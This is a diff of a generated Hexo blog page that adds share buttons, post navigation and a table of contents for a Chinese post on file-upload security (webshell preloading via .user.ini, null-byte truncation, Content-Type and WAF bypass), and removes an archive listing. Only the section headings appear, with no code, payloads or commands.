+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/15/%E5%86%AC%E4%BB%A4%E8%90%A5%E6%A8%A1%E5%9D%97%E4%BA%8C%E9%A2%98%E7%9B%AE/" class="archive-article-date">
-        <time datetime="2025-02-15T14:31:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-15</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2025/02/15/%E5%86%AC%E4%BB%A4%E8%90%A5%E6%A8%A1%E5%9D%97%E4%BA%8C%E9%A2%98%E7%9B%AE/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">冬令营模块二题目</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/15/%E5%86%AC%E4%BB%A4%E8%90%A5%E6%A8%A1%E5%9D%97%E4%BA%8C%E9%A2%98%E7%9B%AE/" target="_blank">冬令营模块二题目</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95"><span class="toc-number">1.1.</span> <span class="toc-text">创建一个文件上传表单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%8A%E4%BC%A0%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">创建上传脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">上传限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E8%A2%AB%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.</span> <span class="toc-text">保存被上传的文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E7%94%A8%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">eval用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval-%E7%9A%84%E7%94%A8%E6%B3%95%EF%BC%9A%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BA-PHP-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.5.1.</span> <span class="toc-text">eval() 的用法：将字符串作为 PHP 代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.2.</span> <span class="toc-text">常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AF%AD%E5%8F%A5%E6%9C%AB%E5%B0%BE%E5%BF%85%E9%A1%BB%E6%9C%89"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">1. 语句末尾必须有 ;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8D%95%E5%BC%95%E5%8F%B7-%E4%B8%8E-%E5%8F%8C%E5%BC%95%E5%8F%B7-%E8%BD%AC%E4%B9%89%E9%97%AE%E9%A2%98"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">2. 单引号 &#39;&#39; 与 双引号 &quot;&quot; 转义问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. 变量注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E7%9A%84%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.</span> <span class="toc-text">前端的过滤绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BB%95%E8%BF%87-JavaScript-%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. 绕过 JavaScript 过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A%E8%A1%A8%E5%8D%95%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">示例：表单字符限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BB%95%E8%BF%87-HTML-%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. 绕过 HTML 过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E7%A6%81%E7%94%A8-JavaScript"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">（1）禁用 JavaScript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E4%BF%AE%E6%94%B9-HTML-%E4%BB%A3%E7%A0%81"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">（2）修改 HTML 代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%95%E8%BF%87-JavaScript-%E5%85%B3%E9%94%AE%E5%AD%97%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. 绕过 JavaScript 关键字替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%BB%95%E8%BF%87%E5%89%8D%E7%AB%AF-XSS-%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.4.</span> <span class="toc-text">4. 绕过前端 XSS 过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%95%E8%BF%87-WAF%EF%BC%88Web-%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%89"><span class="toc-number">1.6.5.</span> <span class="toc-text">5. 绕过 WAF（Web 应用防火墙）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%BB%95%E8%BF%87-URL-%E8%BF%87%E6%BB%A4"><span class="toc-number">1.6.6.</span> <span class="toc-text">6. 绕过 URL 过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini%E6%98%AF%E5%81%9A%E4%BB%80%E4%B9%88%E7%9A%84"><span class="toc-number">1.7.</span> <span class="toc-text">.user.ini是做什么的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.7.1.</span> <span class="toc-text">.user.ini 的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-user-ini-%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-number">1.7.2.</span> <span class="toc-text">1. .user.ini 的基本用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-auto-prepend-file%EF%BC%88%E5%89%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD-Webshell%EF%BC%89"><span class="toc-number">1.7.3.</span> <span class="toc-text">2. auto_prepend_file（前置加载 Webshell）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-disable-functions"><span class="toc-number">1.7.3.1.</span> <span class="toc-text">绕过 disable_functions</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-open-basedir-%E7%BB%95%E8%BF%87%E7%9B%AE%E5%BD%95%E9%99%90%E5%88%B6"><span class="toc-number">1.7.4.</span> <span class="toc-text">3. open_basedir 绕过目录限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-user-ini-%E7%9A%84%E7%94%9F%E6%95%88%E8%A7%84%E5%88%99"><span class="toc-number">1.7.5.</span> <span class="toc-text">4. .user.ini 的生效规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-user-ini-%E5%9C%A8%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.6.</span> <span class="toc-text">5. .user.ini 在安全中的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89Webshell-%E9%9A%90%E8%97%8F"><span class="toc-number">1.7.6.1.</span> <span class="toc-text">（1）Webshell 隐藏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%BB%95%E8%BF%87-disable-functions"><span class="toc-number">1.7.6.2.</span> <span class="toc-text">（2）绕过 disable_functions</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.7.6.3.</span> <span class="toc-text">（3）权限控制绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00-%E6%88%AA%E6%96%AD%EF%BC%88NULL-%E6%88%AA%E6%96%AD%EF%BC%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.</span> <span class="toc-text">00 截断（NULL 截断）漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-00-%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.8.1.</span> <span class="toc-text">1. 00 截断的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-00-%E6%88%AA%E6%96%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.2.</span> <span class="toc-text">2. 00 截断的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">服务器代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%BB%95%E8%BF%87-file-exists-%E4%B8%8E-include"><span class="toc-number">1.8.3.</span> <span class="toc-text">（2）绕过 file_exists() 与 include()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E7%BB%95%E8%BF%87-strpos-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">1.8.4.</span> <span class="toc-text">（3）绕过 strpos() 关键字过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Type%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">Content-Type的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.9.1.</span> <span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E4%BC%AA%E9%80%A0-Content-Type"><span class="toc-number">1.9.1.1.</span> <span class="toc-text">（1）伪造 Content-Type</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E4%BD%BF%E7%94%A8%E5%8F%8C%E6%89%A9%E5%B1%95%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.1.2.</span> <span class="toc-text">（2）使用双扩展名绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89Content-Type-%E4%B8%BA%E7%A9%BA%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.1.3.</span> <span class="toc-text">（3）Content-Type 为空绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89Content-Type-%E5%A4%B4%E9%83%A8%E6%B1%A1%E6%9F%93"><span class="toc-number">1.9.1.4.</span> <span class="toc-text">（4）Content-Type 头部污染</span></a></li></ol></li></ol></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/15/%E5%86%AC%E4%BB%A4%E8%90%A5%E6%A8%A1%E5%9D%97%E4%BA%8C/" class="archive-article-date">
-        <time datetime="2025-02-15T14:30:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-15</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/15/%E5%86%AC%E4%BB%A4%E8%90%A5%E6%A8%A1%E5%9D%97%E4%BA%8C/" target="_blank">冬令营模块二</a>
-  
-    </h1>
-  
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%8F%8A%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" class="archive-article-date">
-        <time datetime="2025-02-04T07:59:23.288Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/%E5%86%AC%E4%BB%A4%E8%90%A5%E6%A8%A1%E5%9D%97%E4%B8%80/" class="archive-article-date">
-        <time datetime="2025-02-04T03:18:26.587Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/MySQL%E5%BE%85%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98/" class="archive-article-date">
-        <time datetime="2025-02-04T03:17:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/04/MySQL%E5%BE%85%E8%A7%A3%E5%86%B3%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank">MySQL待解决的问题</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/PHP%E8%A1%A8%E5%8D%95/" class="archive-article-date">
-        <time datetime="2025-02-04T03:00:46.504Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
 
-        </div>
-    	 
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/PHP/" class="archive-article-date">
-        <time datetime="2025-02-04T03:00:41.435Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
 
-        </div>
-    	 
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/MySQL/" class="archive-article-date">
-        <time datetime="2025-02-04T03:00:23.748Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
 
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2025/02/04/Linux%E5%BE%85%E8%A7%A3%E7%AD%94%E7%9A%84%E9%97%AE%E9%A2%98/" class="archive-article-date">
-        <time datetime="2025-02-04T02:59:56.001Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-04</time>
-</a>
-
-        </div>
-    	 
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -541,8 +719,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
